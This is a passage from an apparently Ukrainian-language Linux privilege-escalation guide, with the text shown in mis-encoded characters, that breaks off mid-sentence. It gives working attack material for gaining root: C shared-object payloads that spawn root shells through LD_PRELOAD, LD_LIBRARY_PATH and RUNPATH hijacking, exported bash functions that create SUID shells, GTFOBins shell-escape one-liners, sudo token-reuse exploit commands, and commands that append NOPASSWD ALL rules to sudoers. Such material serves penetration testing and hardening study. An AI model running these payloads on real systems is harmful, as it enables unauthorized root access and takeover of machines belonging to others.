–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ suid-–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –≤–∏–∫–ª–∏–∫–∞—î _**/usr/sbin/service apache2 start**_, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é —Ç–∞ –µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ —ó—ó:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

–ó–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **LD\_PRELOAD** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ –æ–¥–Ω—ñ—î—ó –∞–±–æ –¥–µ–∫—ñ–ª—å–∫–æ—Ö —Å–ø—ñ–ª—å–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ (.so —Ñ–∞–π–ª–∏), —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á–µ–º –ø–µ—Ä–µ–¥ —É—Å—ñ–º–∞ —ñ–Ω—à–∏–º–∏, –≤–∫–ª—é—á–∞—é—á–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É C (`libc.so`). –¶–µ–π –ø—Ä–æ—Ü–µ—Å –≤—ñ–¥–æ–º–∏–π —è–∫ –ø–æ–ø–µ—Ä–µ–¥–Ω—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.

–û–¥–Ω–∞–∫, –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ —Å–∏—Å—Ç–µ–º–∏ —Ç–∞ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ—î—é, –æ—Å–æ–±–ª–∏–≤–æ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∑ –ø—Ä–∞–≤–∞–º–∏ suid/sgid, —Å–∏—Å—Ç–µ–º–∞ –Ω–∞–∫–ª–∞–¥–∞—î –ø–µ–≤–Ω—ñ —É–º–æ–≤–∏:

* –ó–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á —ñ–≥–Ω–æ—Ä—É—î **LD\_PRELOAD** –¥–ª—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –¥–µ —Ä–µ–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (_ruid_) –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–º—É —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (_euid_).
* –î–ª—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∑ suid/sgid –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è –ª–∏—à–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö —à–ª—è—Ö–∞—Ö, —è–∫—ñ —Ç–∞–∫–æ–∂ –º–∞—é—Ç—å suid/sgid.

–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –º–æ–∂–µ –≤—ñ–¥–±—É—Ç–∏—Å—è, —è–∫—â–æ —É –≤–∞—Å —î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –∑ `sudo`, –∞ –≤–∏–≤—ñ–¥ `sudo -l` –º—ñ—Å—Ç–∏—Ç—å –∑–∞—è–≤—É **env\_keep+=LD\_PRELOAD**. –¶—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω–Ω—ñ–π —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **LD\_PRELOAD** –∑–∞–ª–∏—à–∞—Ç–∏—Å—è —Ç–∞ –≤–∏–∑–Ω–∞–≤–∞—Ç–∏—Å—è –Ω–∞–≤—ñ—Ç—å –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –∑ `sudo`, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
```
Defaults        env_keep += LD_PRELOAD
```
–ó–±–µ—Ä–µ–≥—Ç–∏ —è–∫ **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
–ü–æ—Ç—ñ–º **—Å–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –π–æ–≥–æ**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
–ù–∞—Ä–µ—à—Ç—ñ, **–ø—ñ–¥–≤–∏—â—Ç–µ –ø—Ä–∏–≤—ñ–ª–µ—ó** –∑–∞–ø—É—Å–∫–∞—é—á–∏
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
–ü–æ–¥—ñ–±–Ω–∏–π –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–æ, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∫–æ–Ω—Ç—Ä–æ–ª—é—î –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **LD\_LIBRARY\_PATH**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –∫–æ–Ω—Ç—Ä–æ–ª—é—î —à–ª—è—Ö, –¥–µ –±—É–¥—É—Ç—å —à—É–∫–∞—Ç–∏—Å—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary ‚Äì .so —ñ–Ω'—î–∫—Ü—ñ—è

–ü—Ä–∏ –∑—É—Å—Ç—Ä—ñ—á—ñ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **SUID**, —è–∫–∏–π –≤–∏–≥–ª—è–¥–∞—î –Ω–µ–∑–≤–∏—á–∞–π–Ω–æ, –∫–æ—Ä–∏—Å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î —Ñ–∞–π–ª–∏ **.so**. –¶–µ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, –≤–∏–∫–æ–Ω–∞–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑—ñ—Ç–∫–Ω–µ–Ω–Ω—è –∑ –ø–æ–º–∏–ª–∫–æ—é —Ç–∏–ø—É _"open(‚Äú/path/to/.config/libcalc.so‚Äù, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—É –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

–î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—å–æ–≥–æ, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º—ñ–≥ –±–∏ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ —Ñ–∞–π–ª –° –∑ –Ω–∞–∑–≤–æ—é _"/path/to/.config/libcalc.c"_, —â–æ –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
–¶–µ–π –∫–æ–¥, –ø—ñ—Å–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª–∞–º–∏ —Ñ–∞–π–ª—ñ–≤ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ–±–æ–ª–æ–Ω–∫–∏ –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –≤–∏—â–µ–∑–∞–∑–Ω–∞—á–µ–Ω–∏–π —Ñ–∞–π–ª C —É —Ñ–∞–π–ª –æ–±'—î–∫—Ç–∞ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º .so –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Å–ø—ñ–ª—å–Ω–∏–º –æ–±'—î–∫—Ç–æ–º
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
–¢–µ–ø–µ—Ä, –∫–æ–ª–∏ –º–∏ –∑–Ω–∞–π—à–ª–∏ SUID-–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∑ –ø–∞–ø–∫–∏, –∫—É–¥–∏ –º–∏ –º–æ–∂–µ–º–æ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏, —Å—Ç–≤–æ—Ä–∏–º–æ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –≤ —Ü—ñ–π –ø–∞–ø—Ü—ñ –∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—é –Ω–∞–∑–≤–æ—é:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –ø–æ–º–∏–ª–∫—É —Ç–∞–∫–æ–≥–æ —Ç–∏–ø—É
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —É –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ–π –≤–∞–º–∏ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—è –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) - —Ü–µ –ø—ñ–¥—ñ–±—Ä–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫ Unix-–±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º –¥–ª—è –æ–±—Ö–æ–¥—É –ª–æ–∫–∞–ª—å–Ω–∏—Ö –æ–±–º–µ–∂–µ–Ω—å –±–µ–∑–ø–µ–∫–∏. [**GTFOArgs**](https://gtfoargs.github.io/) - —Ç–µ –∂ —Å–∞–º–µ, –∞–ª–µ –¥–ª—è –≤–∏–ø–∞–¥–∫—ñ–≤, –∫–æ–ª–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–ª–∏—à–µ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∏** —É –∫–æ–º–∞–Ω–¥—É.

–ü—Ä–æ–µ–∫—Ç –∑–±–∏—Ä–∞—î –∑–∞–∫–æ–Ω–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó Unix-–±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ –¥–ª—è –≤–∏—Ö–æ–¥—É –∑ –æ–±–º–µ–∂–µ–Ω–∏—Ö –æ–±–æ–ª–æ–Ω–æ–∫, –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –∞–±–æ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –ø—ñ–¥–≤–∏—â–µ–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –ø–µ—Ä–µ–¥–∞—á—ñ —Ñ–∞–π–ª—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–∏–≤'—è–∑–∞–Ω–∏—Ö —Ç–∞ –∑–≤–æ—Ä–æ—Ç–Ω–∏—Ö –æ–±–æ–ª–æ–Ω–æ–∫ —Ç–∞ —Å–ø—Ä–∏—è–Ω–Ω—è —ñ–Ω—à–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ `sudo -l`, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –∑–Ω–∞—Ö–æ–¥–∏—Ç—å —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –ø—Ä–∞–≤–∏–ª–∞ sudo.

### –ü–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ Sudo

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ —É –≤–∞—Å —î **–¥–æ—Å—Ç—É–ø –¥–æ sudo**, –∞–ª–µ –Ω–µ–º–∞—î –ø–∞—Ä–æ–ª—è, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, **—á–µ–∫–∞—é—á–∏ –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏ sudo, –∞ –ø–æ—Ç—ñ–º –∑–∞—Ö–æ–ø–ª—é—é—á–∏ —Ç–æ–∫–µ–Ω —Å–µ–∞–Ω—Å—É**.

–í–∏–º–æ–≥–∏ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:

* –£ –≤–∞—Å –≤–∂–µ —î –æ–±–æ–ª–æ–Ω–∫–∞ —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á "_sampleuser_"
* "_sampleuser_" **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ `sudo`** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–æ–≥–æ—Å—å **–æ—Å—Ç–∞–Ω–Ω—ñ 15 —Ö–≤–∏–ª–∏–Ω** (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü–µ —Ç—Ä–∏–≤–∞–ª—ñ—Å—Ç—å —Ç–æ–∫–µ–Ω–∞ sudo, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `sudo` –±–µ–∑ –≤–≤–µ–¥–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è)
* `cat /proc/sys/kernel/yama/ptrace_scope` –¥–æ—Ä—ñ–≤–Ω—é—î 0
* `gdb` –¥–æ—Å—Ç—É–ø–Ω–∏–π (–≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –π–æ–≥–æ)

(–í–∏ –º–æ–∂–µ—Ç–µ —Ç–∏–º—á–∞—Å–æ–≤–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ `ptrace_scope` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` –∞–±–æ –ø–æ—Å—Ç—ñ–π–Ω–æ –∑–º—ñ–Ω–∏–≤—à–∏ `/etc/sysctl.d/10-ptrace.conf` —ñ –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ `kernel.yama.ptrace_scope = 0`)

–Ø–∫—â–æ –≤—Å—ñ —Ü—ñ –≤–∏–º–æ–≥–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ, **–≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **–ü–µ—Ä—à–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è** (`exploit.sh`) —Å—Ç–≤–æ—Ä–∏—Ç—å –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `activate_sudo_token` –≤ _/tmp_. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **–∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —Ç–æ–∫–µ–Ω–∞ sudo —É –≤–∞—à–æ–º—É —Å–µ–∞–Ω—Å—ñ** (–≤–∏ –Ω–µ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ–±–æ–ª–æ–Ω–∫—É root, –≤–∏–∫–æ–Ω–∞–π—Ç–µ `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* –î—Ä—É–≥–∞ **–µ–∫—Å–ø–ª–æ–π—Ç–∞** (`exploit_v2.sh`) —Å—Ç–≤–æ—Ä–∏—Ç—å –æ–±–æ–ª–æ–Ω–∫—É sh –≤ _/tmp_ **–Ω–∞–ª–µ–∂–Ω—ñ—Å—Ç—å root –∑ setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* –¢—Ä–µ—Ç—ñ–π –µ–∫—Å–ø–ª–æ–π—Ç (`exploit_v3.sh`) —Å—Ç–≤–æ—Ä–∏—Ç—å —Ñ–∞–π–ª sudoers, —è–∫–∏–π —Ä–æ–±–∏—Ç—å —Ç–æ–∫–µ–Ω–∏ sudo –≤—ñ—á–Ω–∏–º–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª—è—î –≤—Å—ñ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ sudo.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<–Ü–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞>

–Ø–∫—â–æ —É –≤–∞—Å —î **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å** —É –ø–∞–ø—Ü—ñ –∞–±–æ –Ω–∞ –±—É–¥—å-—è–∫–æ–º—É –∑ —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–ø–∫–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—É sudo –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ PID**.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª _/var/run/sudo/ts/sampleuser_ —ñ —É –≤–∞—Å —î –æ–±–æ–ª–æ–Ω–∫–∞ —è–∫ —Ü–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ PID 1234, –≤–∏ –º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó sudo** –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—á–∏ –∑–Ω–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è, –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

–§–∞–π–ª `/etc/sudoers` —Ç–∞ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `/etc/sudoers.d` –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—Ç—å, —Ö—Ç–æ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `sudo` —Ç–∞ —è–∫. –¶—ñ —Ñ–∞–π–ª–∏ **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–æ—á–∏—Ç–∞–Ω—ñ –ª–∏—à–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º root —Ç–∞ –≥—Ä—É–ø–æ—é root**.\
**–Ø–∫—â–æ** –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏** —Ü–µ–π —Ñ–∞–π–ª, –≤–∏ –º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, —ñ —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Å–∞—Ç–∏** –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–∏—Å–∞—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
–©–µ –æ–¥–∏–Ω —Å–ø–æ—Å—ñ–± –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

–Ü—Å–Ω—É—é—Ç—å –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏ –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—É `sudo`, —Ç–∞–∫—ñ —è–∫ `doas` –¥–ª—è OpenBSD, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –π–æ–≥–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑–∞ —à–ª—è—Ö–æ–º `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è Sudo

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–∞–∑–≤–∏—á–∞–π –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ –º–∞—à–∏–Ω–∏ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `sudo`** –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —ñ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –æ–±–æ–ª–æ–Ω–∫—É –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª sudo**, —è–∫–∏–π –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –≤–∞—à –∫–æ–¥ –≤ 